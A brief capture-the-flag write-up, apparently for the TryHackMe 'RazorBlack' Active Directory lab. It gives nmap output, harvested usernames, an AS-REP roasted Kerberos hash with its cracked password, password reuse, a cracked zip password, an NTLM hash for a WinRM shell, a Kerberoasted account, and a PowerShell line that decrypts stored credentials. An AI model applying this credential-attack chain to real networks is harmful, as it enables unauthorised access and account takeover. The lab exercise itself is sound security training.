Links: [[00 - Global Index (Start Here!)]] [[03 - Try Hack Me]]

# [RazorBlack]
## Notes

IP: 10.10.135.182
Nmap scan:
```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-24 13:47:49Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   DNS_Tree_Name: raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2022-04-24T13:50:15+00:00
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2022-04-23T13:46:29
|_Not valid after:  2022-10-23T13:46:29
|_ssl-date: 2022-04-24T13:50:32+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/24%Time=62655509%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-04-24T13:50:17
|_  start_date: N/A
```
nothing on SMB share with null auth.

Domain name: raz0rblack.thm
ldapsearch for users
two files with  nfs one is a flag and the other is a list of usernames
```bash
daven port  
imogen royce  
tamara vidal  
arthur edwards  
carl ingram  
nolan cassidy  
reza zaydan  
ljudmila vetrova  
rico delgado  
tyson williams  
steven bradley  
chamber lin
```
formatting to a txt file
```bash
  
dport  
iroyce  
tvidal  
aedwards  
cingram  
ncassidy  
rzaydan  
lvetrova  
rdelgado  
twilliams  
sbradley
clin
```
get a hash
```bash
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:204f5a58560ef786e5f0120345ba62d2$929df2cdb8bad3adaed4af263406e9bda1f0680d1beddb5571f1844dd6e784832880d2eb85f4f7a94d6b0ef0c2f30fd7eac4bb3096e1c19cd1eb320d7efb74de0107b0ac20f58ebb53d7908bf595ff40197b66c512165a5f02e98963c54d20d48f72da656d4ef4e3683eacfb6d16e2e1914670060196b14ca54f37a7c5c269063579ede5a179ff4f9da3ace5f57e6fc2bcbcd09d06b54de5af4e4cd33982c303734bf3f54c7fe6ba7039cb9a44457d2fac16d09cf42c1cc8b74e29bc6766894d6a2f32c1f0b74a2bb2b1bea46e85442999745ebd80a3b1d8fc733df2a0e83582c5649f140f8f04840eaba9687397b58f:roastpotatoes
```

see if anyother user on smb has the same password.

sbradley does.
login to the trash share and crack the zip with zip2john
electromagnetismo

from here find ljudmilas hash for a winrm shell f220d3988deb3f516c73f40ee16c431d 

use GetUserSPN.py and get a hit for xyan1d3:cyanide9amine5628
```bash
$Credential = Import-Clixml -Path "xyan1d3.xml"   $Credential.GetNetworkCredential().password`
```
will give the userpassword